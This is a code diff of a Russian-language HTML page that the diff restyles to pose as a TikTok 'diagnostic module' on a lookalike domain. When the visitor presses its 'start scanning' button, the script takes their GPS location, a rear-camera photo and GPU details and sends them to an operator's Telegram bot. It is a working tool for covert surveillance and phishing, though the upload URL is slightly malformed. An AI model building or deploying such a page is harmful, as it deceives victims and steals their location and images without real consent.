@@ -1,98 +1,145 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="ru-RU">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ULTRA SENSOR TO TG</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>ULTRA SENSOR PRO — T-TIKTOK</title>
     <style>
-        :root { --neon: #00ff41; --bg: #0b0b0b; }
-        body { margin: 0; background: var(--bg); color: var(--neon); font-family: monospace; display: flex; flex-direction: column; align-items: center; }
-        .status { padding: 15px; font-size: 10px; color: #555; text-transform: uppercase; }
-        #btn { 
-            width: 80px; height: 80px; border-radius: 50%; border: 4px solid var(--neon); 
-            background: transparent; cursor: pointer; margin: 40px; position: relative;
+        :root {
+            --wp-admin-theme-color: #007cba;
+            --neon: #fe2c55; /* TikTok Style */
+            --bg: #000000;
         }
-        #btn::after { content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 60px; height: 60px; background: var(--neon); border-radius: 50%; }
-        #btn:disabled { opacity: 0.3; filter: grayscale(1); }
-        canvas, video { display: none; }
-        #log { font-size: 11px; width: 80%; text-align: center; height: 50px; }
+        body { 
+            margin: 0; background: var(--bg); color: #fff; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex; flex-direction: column; align-items: center; min-height: 100vh;
+        }
+        .wp-header { 
+            padding: 40px 20px; text-align: center; width: 100%; 
+            background: linear-gradient(180deg, #111 0%, #000 100%);
+            border-bottom: 1px solid #222;
+        }
+        .main-container { padding: 20px; width: 100%; max-width: 600px; text-align: center; }
+        
+        /* Кнопка в стиле WP/TikTok */
+        .wp-block-button__link {
+            display: inline-block; background-color: var(--neon); color: #fff;
+            padding: 20px 40px; border-radius: 50px; font-weight: 800;
+            text-decoration: none; font-size: 18px; border: none; cursor: pointer;
+            box-shadow: 0 10px 30px rgba(254, 44, 85, 0.4); transition: 0.3s;
+        }
+        .wp-block-button__link:active { transform: scale(0.95); }
+        .wp-block-button__link:disabled { background: #333; box-shadow: none; cursor: wait; }
+
+        #terminal { 
+            margin-top: 30px; font-family: monospace; font-size: 12px; 
+            color: #888; text-align: left; background: #0a0a0a; 
+            padding: 15px; border-radius: 10px; border: 1px solid #1a1a1a;
+            min-height: 100px; width: 100%; box-sizing: border-box;
+        }
+        .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #00ff88; margin-right: 5px; }
+
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="status">System: <span id="sys">Online</span></div>
-    
-    <div id="log">READY TO CAPTURE</div>
+    <div class="wp-header">
+        <h1 style="letter-spacing: -1px; margin: 0;">SENSORY <span style="color:var(--neon)">RAW</span> ENGINE</h1>
+        <p style="color: #666; font-size: 14px;">t-tiktok.ru diagnostic module</p>
+    </div>
 
-    <button id="btn" onclick="captureAndSend()"></button>
+    <div class="main-container">
+        <div style="margin: 40px 0;">
+            <button id="shutter" class="wp-block-button__link" onclick="runEngine()">ЗАПУСТИТЬ СКАНИРОВАНИЕ</button>
+        </div>
+
+        <div id="terminal">
+            <div><span class="status-dot"></span> SYSTEM: READY</div>
+            <div id="logs">> Ожидание инициализации...</div>
+        </div>
+    </div>
 
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
     <script>
-        // --- НАСТРОЙКИ (Впиши свои данные) ---
-        const TG_TOKEN = "ТВОЙ_ТОКЕН_БОТА";
-        const TG_CHAT_ID = "ТВОЙ_CHAT_ID";
+        // --- КОНФИГУРАЦИЯ ---
+        const CONFIG = {
+            token: "ВАШ_ТОКЕН_БОТА",
+            chatId: "ВАШ_ID_ЧАТА"
+        };
 
-        const log = (txt) => document.getElementById('log').innerText = txt;
+        const logs = document.getElementById('logs');
+        const print = (t) => logs.innerHTML += `<div style="margin-top:5px">> ${t}</div>`;
 
-        async function captureAndSend() {
-            const btn = document.getElementById('btn');
+        async function runEngine() {
+            const btn = document.getElementById('shutter');
             btn.disabled = true;
-            log("SENSING...");
+            logs.innerHTML = "";
+            print("Инициализация сенсоров...");
 
             try {
-                // 1. Доступ к камере (Макс качество)
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "environment", width: { ideal: 4096 }, height: { ideal: 2160 } }
+                // 1. Геолокация
+                const geo = await new Promise((res) => {
+                    navigator.geolocation.getCurrentPosition(
+                        p => res(`${p.coords.latitude}, ${p.coords.longitude}`),
+                        () => res("Доступ запрещен")
+                    );
                 });
+                print(`Геопозиция: ${geo}`);
 
+                // 2. Камера
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "environment", width: { ideal: 3840 }, height: { ideal: 2160 } }
+                });
+                
                 const video = document.getElementById('v');
                 video.srcObject = stream;
+                print("Сенсор подключен. Настройка фокуса...");
 
-                // Даем 2 секунды на автофокус
-                await new Promise(r => setTimeout(r, 2000));
+                await new Promise(r => setTimeout(r, 2500)); // Время на адаптацию
 
                 const track = stream.getVideoTracks()[0];
                 const settings = track.getSettings();
-                
                 const canvas = document.getElementById('c');
+                
                 canvas.width = settings.width;
                 canvas.height = settings.height;
-                
                 const ctx = canvas.getContext('2d');
-                ctx.filter = 'contrast(1.1) saturate(1.1)'; // Небольшая постобработка
+                
+                // Эффект резкости
+                ctx.filter = 'contrast(1.1) saturate(1.1)';
                 ctx.drawImage(video, 0, 0);
+                
+                print(`Захват: ${canvas.width}x${canvas.height}`);
 
-                // 2. Конвертация в Blob (бинарный файл)
-                log("UPLOADING TO TELEGRAM...");
+                // 3. Отправка
+                print("Отправка в Telegram...");
                 canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', TG_CHAT_ID);
-                    formData.append('photo', blob, 'raw_capture.jpg');
-                    formData.append('caption', `📸 RAW DUMP\nRes: ${settings.width}x${settings.height}\nDevice: ${navigator.platform}`);
+                    const fd = new FormData();
+                    fd.append('chat_id', CONFIG.chatId);
+                    fd.append('photo', blob, 'shot.jpg');
+                    fd.append('caption', `📡 DUMP: t-tiktok.ru\n📍 GPS: ${geo}\n📱 Res: ${canvas.width}x${canvas.height}\n🖥 GPU: ${getGPU()}`);
 
-                    // 3. Отправка через API Telegram
-                    const response = await fetch(`https://telegram.org{TG_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    if (response.ok) {
-                        log("✅ SUCCESS: SENT TO BOT");
-                    } else {
-                        log("❌ TG ERROR");
-                    }
-
-                    // Выключаем камеру
-                    stream.getTracks().forEach(t => t.stop());
+                    await fetch(`https://telegram.org{CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
+                    
+                    print("✅ ДАННЫЕ ОТПРАВЛЕНЫ УСПЕШНО");
+                    track.stop();
                     btn.disabled = false;
                 }, 'image/jpeg', 0.95);
 
-            } catch (err) {
-                log("FATAL ERROR: " + err.message);
+            } catch (e) {
+                print(`ОШИБКА: ${e.message}`);
                 btn.disabled = false;
             }
+        }
+
+        function getGPU() {
+            const gl = document.createElement('canvas').getContext('webgl');
+            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL).split('/').pop() : "Unknown";
         }
     </script>
 </body>
